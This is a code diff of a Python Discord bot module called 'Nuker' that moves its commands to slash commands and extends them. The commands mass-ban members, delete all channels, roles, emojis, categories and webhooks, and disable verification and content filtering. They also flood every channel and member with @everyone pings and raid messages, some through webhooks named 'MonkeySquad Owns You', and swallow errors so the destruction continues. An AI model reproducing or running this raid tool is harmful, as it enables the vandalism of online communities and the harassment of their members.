@@ -7,8 +7,7 @@ class Nuker(commands.Cog):
    def __init__(self, bot):
       self.bot = bot
 
-
-   @commands.command(
+   @commands.slash_command(
       name="banall",
    )
    async def banall(self, interaction):
@@ -17,7 +16,7 @@ class Nuker(commands.Cog):
          bannedmembers += 1
       print(f"Banned {bannedmembers} members")
       
-   @commands.command(
+   @commands.slash_command(
       name="kickall",
    )
    async def kickall(self, interaction):
@@ -27,7 +26,7 @@ class Nuker(commands.Cog):
       print(f"Kicked {kickedmembers} members")
       
    #
-   @commands.command(
+   @commands.slash_command(
       name="nukeserver"
    )
    async def nukeserver(self, interaction: disnake.ApplicationCommandInteraction):
@@ -42,67 +41,123 @@ class Nuker(commands.Cog):
          discovery_splash=None, 
          community=False, 
          afk_channel=None,  
-         afk_timeout=1, 
+         afk_timeout=3600, 
          default_notifications=disnake.NotificationLevel.all_messages, 
          verification_level=disnake.VerificationLevel.none, 
          explicit_content_filter=disnake.ContentFilter.disabled,
-         vanity_code=None, 
+         # vanity_code=None, 
          system_channel=None, 
-         system_channel_flags=None,
+         # system_channel_flags=None,
          preferred_locale=disnake.Locale.zh_TW,
          rules_channel=None, 
          public_updates_channel=None, 
          premium_progress_bar_enabled=True
          )
       for member in interaction.guild.members:
-         await member.ban()
-         bannedmembers += 1
-      print(f"Banned {bannedmembers} members")
-   
-   @commands.command(
+         try:
+            await member.ban()
+         except:
+            pass
+      
+      for channel in interaction.guild.channels:
+         for _ in range(0, 25):
+            try:
+               await channel.send(interaction.guild.default_role)
+            except:
+               pass
+            
+            
+   @commands.slash_command(
       name="nickall"
    )
    async def nickall(self, interaction, *, arg):
       for member in interaction.guild.members:
-         await member.edit(nick=arg)
-         nicksedited += 1
-      print(f"Edited {nicksedited} nick(s)")
-      
-   @commands.command(
+         try:
+            await member.edit(nick=arg)
+         except:
+            pass
+         
+         
+   @commands.slash_command(
       name="messageall"
    )
    async def messageall(self, interaction, *, arg):
       for member in interaction.guild.members:
-         await member.send(arg)
-         messagessent += 1
-      print(f"Sent {messagessent} message(s)")
+         try:  
+            await member.send(arg)
+         except:
+            pass
    
-   @commands.command(
+   @commands.slash_command(
       name="clearroles"
    )
    async def clearroles(self, interaction):
       for role in interaction.guild.roles:
-         await role.delete()
-         rolesdeleted += 1
-      print(f"Deleted {rolesdeleted} role(s)")
+         try:
+            await role.delete()
+         except:
+            pass
    
-   @commands.command(
+   @commands.slash_command(
       name="clearemojis"
    )
    async def clearemojis(self, interaction):
       for emoji in interaction.guild.emojis:
-         await emoji.delete()
-         deletedemojis += 1
-      print(f"Deleted {deletedemojis} emoji(s)")
-      
-   @commands.command(
+         try:
+            await emoji.delete()
+         except:
+            pass
+         
+   @commands.slash_command(
       name="clearchannels"
    )
    async def clearchannels(self, interaction):
       for channel in interaction.guild.channels:
-         await channel.delete()
-         channelsdeleted += 1
-      print(f"Deleted {channelsdeleted} channel(s)")
+         try:
+            await channel.delete()
+         except:
+            pass
+   
+   @commands.slash_command(
+      name="clearcategories"
+   )
+   async def clearcategories(self, interaction):
+      for category in interaction.guild.categories:
+         try:
+            await category.delete()
+         except:
+            pass
+      
+   @commands.slash_command(
+      name="clearwebhooks"
+   )
+   async def clearwebhooks(self, interaction):
+      for webhook in interaction.guild.webhooks:
+         try:
+            await webhook.delete()
+         except:
+            pass
+         
+   @commands.slash_command(
+      name="webraid"
+   )
+   async def webraid(self, interaction: disnake.ApplicationCommandInteraction, *, arg):
+      for channel in interaction.guild.channels:
+         hook = await channel.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
+         for _ in range(0, 20):
+            await hook.send(f"a{arg}\n{interaction.guild.default_role}")
+      
+   
+   @commands.slash_command(
+      name="sendall"
+   )
+   async def sendall(self, interaction, *, arg):
+      for channel in interaction.guild.channels:
+         try:       
+            for _ in range(0, 25):
+               await channel.send(arg + interaction.guild.default_role)
+         except:
+            pass
       
 def setup(bot):
    bot.add_cog(Nuker(bot))
